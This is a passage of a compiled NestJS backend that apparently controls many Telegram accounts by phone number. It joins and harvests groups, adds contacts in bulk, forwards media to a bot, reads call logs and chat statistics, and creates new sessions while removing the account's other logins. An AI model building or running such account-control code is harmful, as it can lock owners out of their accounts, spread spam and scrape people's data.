    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'groupId', description: 'Group ID', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('groupId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGroupAdmins", null);
__decorate([
    (0, common_1.Get)('group/banned/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get list of banned users in a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'groupId', description: 'Group ID', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('groupId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGroupBannedUsers", null);
__decorate([
    (0, common_1.Post)('contacts/export/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Export contacts in vCard or CSV format' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ContactExportImportDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __param(2, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ContactExportImportDto, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "exportContacts", null);
__decorate([
    (0, common_1.Post)('contacts/import/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Import contacts from a list' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Array]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "importContacts", null);
__decorate([
    (0, common_1.Post)('contacts/block/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Manage blocked contacts' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ContactBlockListDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ContactBlockListDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "manageBlockList", null);
__decorate([
    (0, common_1.Get)('contacts/statistics/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get contact activity statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Contact statistics retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getContactStatistics", null);
__decorate([
    (0, common_1.Post)('folders/create/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new chat folder' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: create_chat_folder_dto_1.CreateChatFolderDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, create_chat_folder_dto_1.CreateChatFolderDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createChatFolder", null);
__decorate([
    (0, common_1.Get)('folders/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all chat folders' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatFolders", null);
__decorate([
    (0, common_1.Put)('messages/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Edit message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "editMessage", null);
__decorate([
    (0, common_1.Post)('chat/settings/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update chat settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateChatSettings", null);
__decorate([
    (0, common_1.Post)('media/batch/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send multiple media files in batch' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMediaBatch", null);
__decorate([
    (0, common_1.Get)('security/2fa-status/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Check if 2FA password is set' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "hasPassword", null);
__decorate([
    (0, common_1.Get)('chats/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chats with advanced filtering' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('limit')),
    __param(2, (0, common_1.Query)('offsetDate')),
    __param(3, (0, common_1.Query)('offsetId')),
    __param(4, (0, common_1.Query)('offsetPeer')),
    __param(5, (0, common_1.Query)('folderId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, Number, Number, String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChats", null);
__decorate([
    (0, common_1.Get)('file/url/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get downloadable URL for a file' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('url')),
    __param(2, (0, common_1.Query)('filename')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getFileUrl", null);
__decorate([
    (0, common_1.Get)('messages/stats/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get message statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMessageStats", null);
__decorate([
    (0, common_1.Get)('chats/top-private/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get top 5 private chats with detailed statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getTopPrivateChats", null);
__decorate([
    (0, common_1.Post)('bots/add-to-channel/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Add bots to channel with admin privileges' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                channelIds: {
                    type: 'array',
                    items: {
                        type: 'string'
                    },
                    description: 'Array of channel IDs to add bots to. If not provided, will use default channels from environment variables.'
                }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Bots added to channels successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addBotsToChannel", null);
__decorate([
    (0, common_1.Post)('bot/create/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new bot using BotFather' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.CreateBotDto }),
    (0, swagger_1.ApiResponse)({
        status: 201,
        description: 'Bot created successfully',
        schema: {
            type: 'object',
            properties: {
                botToken: { type: 'string', description: 'The token to access HTTP Bot API' },
                username: { type: 'string', description: 'The username of the created bot' }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request - Invalid bot details' }),
    (0, swagger_1.ApiResponse)({ status: 401, description: 'Unauthorized - Client not connected' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.CreateBotDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createBot", null);
exports.TelegramController = TelegramController = __decorate([
    (0, common_1.Controller)('telegram'),
    (0, swagger_1.ApiTags)('Telegram'),
    __metadata("design:paramtypes", [Telegram_service_1.TelegramService])
], TelegramController);


/***/ }),

/***/ "./src/components/Telegram/Telegram.module.ts":
/*!****************************************************!*\
  !*** ./src/components/Telegram/Telegram.module.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const Telegram_controller_1 = __webpack_require__(/*! ./Telegram.controller */ "./src/components/Telegram/Telegram.controller.ts");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const telegram_logger_1 = __webpack_require__(/*! ./utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const telegram_validation_config_1 = __webpack_require__(/*! ./config/telegram-validation.config */ "./src/components/Telegram/config/telegram-validation.config.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let TelegramModule = class TelegramModule {
};
exports.TelegramModule = TelegramModule;
exports.TelegramModule = TelegramModule = __decorate([
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            buffer_client_module_1.BufferClientModule,
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule)
        ],
        controllers: [Telegram_controller_1.TelegramController],
        providers: [
            Telegram_service_1.TelegramService,
            telegram_validation_config_1.TelegramValidationConfig,
            {
                provide: 'TELEGRAM_LOGGER',
                useValue: telegram_logger_1.TelegramLogger.getInstance()
            }
        ],
        exports: [Telegram_service_1.TelegramService]
    })
], TelegramModule);


/***/ }),

/***/ "./src/components/Telegram/Telegram.service.ts":
/*!*****************************************************!*\
  !*** ./src/components/Telegram/Telegram.service.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramService = void 0;
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const TelegramManager_1 = __importDefault(__webpack_require__(/*! ./TelegramManager */ "./src/components/Telegram/TelegramManager.ts"));
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const path = __importStar(__webpack_require__(/*! path */ "path"));
const channels_service_1 = __webpack_require__(/*! ../channels/channels.service */ "./src/components/channels/channels.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const telegram_logger_1 = __webpack_require__(/*! ./utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let TelegramService = class TelegramService {
    constructor(usersService, activeChannelsService, channelsService) {
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.channelsService = channelsService;
        this.logger = telegram_logger_1.TelegramLogger.getInstance();
        this.cleanupInterval = connection_manager_1.connectionManager.startCleanupInterval();
        connection_manager_1.connectionManager.setUsersService(this.usersService);
    }
    async onModuleDestroy() {
        this.logger.logOperation('system', 'Module destroy initiated');
        clearInterval(this.cleanupInterval);
        await connection_manager_1.connectionManager.disconnectAll();
    }
    getActiveClientSetup() {
        return TelegramManager_1.default.getActiveClientSetup();
    }
    setActiveClientSetup(data) {
        TelegramManager_1.default.setActiveClientSetup(data);
    }
    async getMessages(mobile, username, limit = 8) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return telegramClient.getMessages(username, limit);
    }
    async getMessagesNew(mobile, username, offset, limit) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return telegramClient.getMessagesNew(username, offset, limit);
    }
    async sendInlineMessage(mobile, chatId, message, url) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return telegramClient.sendInlineMessage(chatId, message, url);
    }
    async getChatId(mobile, username) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getchatId(username);
    }
    async getLastActiveTime(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getLastActiveTime();
    }
    async tryJoiningChannel(mobile, chatEntity) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            await telegramClient.joinChannel(chatEntity.username);
            console.log(telegramClient.phoneNumber, " - Joined channel Success - ", chatEntity.username);
            if (chatEntity.canSendMsgs) {
            }
            else {
                await this.channelsService.remove(chatEntity.channelId);
                await this.activeChannelsService.remove(chatEntity.channelId);
                console.log("Removed Channel- ", chatEntity.username);
            }
        }
        catch (error) {
            console.log(telegramClient.phoneNumber, " - Failed to join - ", chatEntity.username);
            this.removeChannels(error, chatEntity.channelId, chatEntity.username);
            throw error;
        }
    }
    ;
    async removeChannels(error, channelId, username) {
        if (error.errorMessage == "USERNAME_INVALID" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes("No user has")) {
            try {
                if (channelId) {
                    await this.channelsService.remove(channelId);
                    await this.activeChannelsService.remove(channelId);
                    console.log("Removed Channel- ", channelId);
                }
                else {
                    const channelDetails = (await this.channelsService.search({ username: username }))[0];
                    await this.channelsService.remove(channelDetails.channelId);
                    await this.activeChannelsService.remove(channelDetails.channelId);
                    console.log("Removed Channel - ", channelDetails.channelId);
                }
            }
            catch (searchError) {
                console.log("Failed to search/remove channel: ", searchError);
            }
        }
        else if (error.errorMessage === "CHANNEL_PRIVATE") {
            await this.channelsService.update(channelId, { private: true });
            await this.activeChannelsService.update(channelId, { private: true });
        }
    }
    async getGrpMembers(mobile, entity) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            return await telegramClient.getGrpMembers(entity);
        }
        catch (err) {
            console.error("Error fetching group members:", err);
        }
    }
    async addContact(mobile, data, prefix) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            return await telegramClient.addContact(data, prefix);
        }
        catch (err) {
            console.error("Error fetching adding Contacts:", err);
        }
    }
    async addContacts(mobile, phoneNumbers, prefix) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            return await telegramClient.addContacts(phoneNumbers, prefix);
        }
        catch (err) {
            console.error("Error fetching adding Contacts:", err);
        }
    }
    async getSelfMsgsInfo(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getSelfMSgsInfo();
    }
    async createGroup(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.createGroup();
    }
    async forwardMedia(mobile, channel, fromChatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        telegramClient.forwardMedia(channel, fromChatId);
        setTimeout(async () => {
            try {
                await this.leaveChannel(mobile, "2302868706");
            }
            catch (error) {
                console.log("Error in forwardMedia: ", error);
            }
        }, 5 * 60000);
        return "Media forward initiated";
    }
    async forwardMediaToBot(mobile, fromChatId) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            await telegramClient.forwardMediaToBot(fromChatId);
            const dialogs = await telegramClient.getDialogs({ limit: 500 });
            const channels = dialogs
                .filter(chat => chat.isChannel || chat.isGroup)
                .map(chat => {
                const chatEntity = chat.entity;
                const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
                if (!chatEntity.broadcast &&
                    !cannotSendMsgs &&
                    chatEntity.participantsCount > 50 &&
                    (0, utils_1.shouldMatch)(chatEntity)) {
                    return {
                        channelId: chatEntity.id.toString(),
                        canSendMsgs: true,
                        participantsCount: chatEntity.participantsCount,
                        private: false,
                        title: chatEntity.title,
                        broadcast: chatEntity.broadcast,
                        megagroup: chatEntity.megagroup,
                        restricted: chatEntity.restricted,
                        sendMessages: true,
                        username: chatEntity.username,
                        forbidden: false
                    };
                }
                return null;
            })
                .filter((channel) => Boolean(channel));
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            await this.channelsService.createMultiple(channels);
            await this.activeChannelsService.createMultiple(channels);
            return "Media forward initiated successfully";
        }
        catch (error) {
            console.error("Error forwarding media:", error);
            return `Media forward failed: ${error.message}`;
        }
    }
    async blockUser(mobile, chatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.blockUser(chatId);
    }
    async joinChannel(mobile, channelId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.joinChannel(channelId);
    }
    async getCallLog(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getCallLog();
    }
    async getmedia(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getMediaMessages();
    }
    async getChannelInfo(mobile, sendIds = false) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.channelInfo(sendIds);
    }
    async getMe(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getMe();
    }
    async getEntity(mobile, entity) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getEntity(entity);
    }
    async createNewSession(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.createNewSession();
    }
    async set2Fa(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            await telegramClient.set2fa();
            return '2Fa set successfully';
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
    }
    async updatePrivacyforDeletedAccount(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.updatePrivacyforDeletedAccount();
    }
    async deleteProfilePhotos(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.deleteProfilePhotos();
    }
    async setProfilePic(mobile, name) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.deleteProfilePhotos();
        try {
            await cloudinary_1.CloudinaryService.getInstance(name);
            await (0, Helpers_1.sleep)(2000);
            const rootPath = process.cwd();
            console.log("checking path", rootPath);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));
            await (0, Helpers_1.sleep)(1000);
            return 'Profile pic set successfully';
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
    }
    async updatePrivacy(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            await telegramClient.updatePrivacy();
            return "Privacy updated successfully";
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
    }
    async downloadProfilePic(mobile, index) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.downloadProfilePic(index);
        }
        catch (error) {
            console.log("Some Error: ", (0, parseError_1.parseError)(error), error);
            throw new Error("Failed to update username");
        }
    }
    async updateUsername(mobile, username) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.updateUsername(username);
        }
        catch (error) {
            console.log("Some Error: ", (0, parseError_1.parseError)(error), error);
            throw new Error("Failed to update username");
        }
    }
    async getMediaMetadata(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        if (params) {
            return await telegramClient.getAllMediaMetaData(params);
        }
        else {
            return await telegramClient.getMediaMetadata(params);
        }
    }
    async downloadMediaFile(mobile, messageId, chatId, res) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.downloadMediaFile(messageId, chatId, res);
    }
    async forwardMessage(mobile, toChatId, fromChatId, messageId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.forwardMessage(toChatId, fromChatId, messageId);
    }
    async leaveChannels(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const channelinfo = await telegramClient.channelInfo(false);
        const leaveChannelIds = channelinfo.canSendFalseChats;
        telegramClient.leaveChannels(leaveChannelIds);
        return "Left channels initiated";
    }
    async leaveChannel(mobile, channel) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        telegramClient.leaveChannels([channel]);
        return "Left channel initiated";
    }
    async deleteChat(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.deleteChat(params);
    }
    async updateNameandBio(mobile, firstName, about) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.updateProfile(firstName, about);
    }
    async getDialogs(mobile, query) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const { limit = 10, offsetId, archived = false } = query;
        const dialogs = await telegramClient.getDialogs({ limit, offsetId, archived });
        const chatData = [];
        for (const chat of dialogs) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getConnectionStatus() {
        const status = {
            activeConnections: connection_manager_1.connectionManager.getActiveConnectionCount(),
            rateLimited: 0,
            totalOperations: 0
        };
        this.logger.logOperation('system', 'Connection status retrieved', status);
        return status;
    }
    async forwardBulkMessages(mobile, fromChatId, toChatId, messageIds) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.forwardMessages(fromChatId, toChatId, messageIds);
    }
    async getAuths(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const auths = await telegramClient.getAuths();
        this.logger.logOperation(mobile, 'Retrieved authorizations', {
            count: auths?.length || 0
        });
        return auths;
    }
    async removeOtherAuths(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.removeOtherAuths();
        this.logger.logOperation(mobile, 'Removed other authorizations');
        return "Removed other authorizations";
    }
    async processBatch(items, batchSize, processor, delayMs = 2000) {
        const errors = [];
        let processed = 0;
        for (let i = 0; i < items.length; i += batchSize) {
            const batch = items.slice(i, i + batchSize);
            try {
                await processor(batch);
                processed += batch.length;
                if (i + batchSize < items.length) {
                    await new Promise(resolve => setTimeout(resolve, delayMs));
                }
            }
            catch (error) {
                errors.push(error);
                this.logger.logError('batch-process', 'Batch processing failed', error);
            }
        }
        return { processed, errors };
    }
    async createGroupWithOptions(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const result = await telegramClient.createGroupOrChannel(options);
        let groupId;
        if ('chats' in result && Array.isArray(result.chats) && result.chats.length > 0) {
            const chat = result.chats[result.chats.length - 1];
            groupId = chat.id?.toString();
        }
        this.logger.logOperation(mobile, 'Group created', { id: groupId });
        return result;
    }
    async updateGroupSettings(mobile, settings) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.updateGroupSettings(settings);
    }
    async scheduleMessage(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.scheduleMessageSend({
            chatId: options.chatId,
            message: options.message,
            scheduledTime: options.scheduledTime,
            replyTo: options.replyTo,
            silent: options.silent
        });
    }
    async getScheduledMessages(mobile, chatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getScheduledMessages(chatId);
    }
    async sendMediaAlbum(mobile, album) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.sendMediaAlbum(album);
    }
    async sendMessage(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.sendMessage(params);
    }
    async sendVoiceMessage(mobile, voice) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.sendVoiceMessage(voice);
    }
    async cleanupChat(mobile, cleanup) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.cleanupChat(cleanup);
    }
    async getChatStatistics(mobile, chatId, period) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getChatStatistics(chatId, period);
    }
    async updatePrivacyBatch(mobile, settings) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
